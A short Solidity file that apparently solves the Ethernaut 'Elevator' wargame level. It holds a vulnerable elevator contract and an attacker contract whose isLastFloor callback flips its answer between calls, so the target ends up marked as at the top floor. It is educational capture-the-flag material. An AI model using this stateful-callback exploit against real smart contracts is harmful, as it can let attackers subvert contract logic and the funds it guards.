// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Building {
    EthernautElevator target;
    bool flip = true;

    constructor(address _addr) {
        target = EthernautElevator(_addr);
    }

    function attack(uint _floor) public {
        target.goTo(_floor);
    }

    // function can override if not implemented
    function isLastFloor(uint _floor) external returns (bool) {
        if (flip) {
            flip = false;
            return false;
        } else {
            flip = true;
            return true;
        }
    }
}

contract EthernautElevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
